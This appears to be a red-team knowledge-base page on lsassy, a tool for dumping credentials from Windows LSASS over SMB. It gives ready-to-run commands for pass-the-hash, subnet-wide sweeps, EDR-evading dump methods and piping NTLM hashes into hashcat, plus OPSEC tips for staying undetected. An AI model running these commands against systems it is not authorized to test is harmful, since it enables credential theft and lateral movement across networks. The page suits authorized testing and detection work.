# lsassy

**Tags:** `#lsassy` `#lsass` `#credentialdumping` `#remote` `#linux` `#postexploitation` `#windows`

Remote LSASS credential extraction from Linux — dumps LSASS on the target and parses the results in a single command over SMB. Supports 15+ dump methods (comsvcs, procdump, nanodump, EDRSandblast, etc.) and integrates with CrackMapExec/NetExec as a module. No need to manually exfil dump files — extracts credentials and cleans up automatically.

**Source:** https://github.com/Hackndo/lsassy
**Install:** `pip install lsassy` or use via `netexec smb -M lsassy`

```bash
# Dump and parse LSASS in one shot
lsassy -d DOMAIN -u user -p Password 192.168.1.10
```

> [!note] **lsassy vs secretsdump** — secretsdump uses DRSUAPI/SAMR protocols to pull SAM/LSA/NTDS. lsassy dumps live LSASS process memory — captures currently-loaded credentials including WDigest plaintext (if enabled), Kerberos tickets, and cached domain credentials. Use both: secretsdump for domain-wide hash extraction, lsassy for live credential material on individual hosts.

---

## Basic Usage

```bash
# Password auth
lsassy -d DOMAIN -u Administrator -p Password 192.168.1.10

# Pass the Hash
lsassy -d DOMAIN -u Administrator -H :NTLMhash 192.168.1.10

# Kerberos (ccache)
KRB5CCNAME=admin.ccache lsassy -k dc01.domain.local

# Multiple targets (positional, space-separated — there is no -f targets-file flag; -f is --format)
lsassy -d DOMAIN -u Administrator -p Password 192.168.1.10 192.168.1.20 192.168.1.30

# For a host LIST / subnet sweep, drive it through the NetExec module instead
netexec smb hosts.txt -u Administrator -p Password -M lsassy
```

---

## Dump Methods

lsassy supports multiple LSASS dump techniques — switch methods if one is blocked by EDR.

```bash
# Specify dump method with -m
lsassy -d DOMAIN -u user -p Password 192.168.1.10 -m comsvcs
lsassy -d DOMAIN -u user -p Password 192.168.1.10 -m procdump
lsassy -d DOMAIN -u user -p Password 192.168.1.10 -m nanodump
lsassy -d DOMAIN -u user -p Password 192.168.1.10 -m edrsandblast
lsassy -d DOMAIN -u user -p Password 192.168.1.10 -m dumpert
# (-m is --dump-method. There's no --methods list flag; the method set is the
#  table below — plus mirrordump, ppldump, dllinject, silentprocessexit, rawrpc, …)
```

| Method | Notes |
|---|---|
| `comsvcs` | Default — uses `comsvcs.dll MiniDump` LOLBin |
| `procdump` | Sysinternals ProcDump — uploads binary, detected by most AV |
| `nanodump` | Stealthy LSASS dumper — partial dump, lower AV detection |
| `dumpert` | Direct syscall dumper — bypasses some EDR hooks |
| `edrsandblast` | EDR bypass technique |
| `wer` | Windows Error Reporting dump |
| `rdrleakdiag` | LOLBin via `rdrleakdiag.exe` |
| `sqldumper` | LOLBin via `sqldumper.exe` (requires SQL Server) |

---

## Output Options

> [!warning] **`-o` and `-f` are the opposite of what older guides show.** `-f/--format` sets the FORMAT (`pretty` default, `json`, `grep`, `table`); `-o/--outfile` writes to a FILE. `-O` is `--options` (dump-method options), **not** an output file.

```bash
# Default — pretty print to console
lsassy -d DOMAIN -u user -p Password 192.168.1.10

# JSON to a file
lsassy -d DOMAIN -u user -p Password 192.168.1.10 -f json -o /tmp/creds.json

# Grep-friendly / table to console
lsassy -d DOMAIN -u user -p Password 192.168.1.10 -f grep
lsassy -d DOMAIN -u user -p Password 192.168.1.10 -f table
```

---

## CrackMapExec / NetExec Module

lsassy ships as a CME/NetExec module — useful when already running CME for other tasks.

```bash
# NetExec
netexec smb 192.168.1.10 -u Administrator -p Password -M lsassy

# Subnet sweep
netexec smb 192.168.1.0/24 -u Administrator -p Password -M lsassy

# PTH
netexec smb 192.168.1.10 -u Administrator -H :NTLMhash -M lsassy

# Specify dump method via module options
netexec smb 192.168.1.10 -u Administrator -p Password -M lsassy -o METHOD=nanodump

# CrackMapExec (older installs)
crackmapexec smb 192.168.1.10 -u Administrator -p Password -M lsassy
```

---

## Dump File Options

By default lsassy uploads the dump method, dumps LSASS, parses, and deletes the dump. You can control this:

```bash
# Keep the dump file on the target (don't delete)
lsassy -d DOMAIN -u user -p Password 192.168.1.10 --keep-dump

# Specify where to write the dump on the target
lsassy -d DOMAIN -u user -p Password 192.168.1.10 --dump-path C:\\Windows\\Temp --dump-name lsass.dmp

# Parse a pre-existing dump already on the target (flag is --parse-only, not --no-dump)
lsassy -d DOMAIN -u user -p Password 192.168.1.10 --dump-path C:\\Windows\\Temp --dump-name existing.dmp --parse-only

# Dump only, don't parse (grab the .dmp for offline pypykatz)
lsassy -d DOMAIN -u user -p Password 192.168.1.10 --dump-only --keep-dump
```

---

## Parsing Output

```bash
# lsassy outputs in format: domain\user NT:hash
# Extract just hashes for hashcat (-f grep for the grep-friendly format)
lsassy -d DOMAIN -u user -p Password 192.168.1.10 -f grep | grep -oP '[0-9a-f]{32}' | sort -u > ntlm.txt

# Feed directly to hashcat
lsassy -d DOMAIN -u user -p Password 192.168.1.10 -f grep | \
  grep -oP '[0-9a-f]{32}' | sort -u | \
  hashcat -m 1000 - /usr/share/wordlists/rockyou.txt
```

---

## OPSEC Notes

- lsassy triggers LSASS handle acquisition on the target — Event ID **10** (Sysmon) and **4656** (Windows Security)
- `comsvcs` method is most detectable — `nanodump` and `dumpert` are lower-footprint alternatives
- Dump file is created and deleted automatically by default — residual artifacts are minimal
- SMB authentication events (4624/4648) generated regardless of method
- Run targeted (single host) rather than subnet sweeps when OPSEC matters

---

> [!note] **See also** — pairs with [[Tools/Credential Dumping/secretsdump|secretsdump]] (SAM/LSA/NTDS via DRSUAPI vs live LSASS here); drive host sweeps and the `-M lsassy` module through [[Tools/Lateral Movement/NetExec|NetExec]]; the DPAPI-secrets remote-loot counterpart is [[Tools/Credential Dumping/DonPAPI|DonPAPI]].

---

*Created: 2026-03-06*
*Updated: 2026-08-27*
*Model: claude-opus-5*
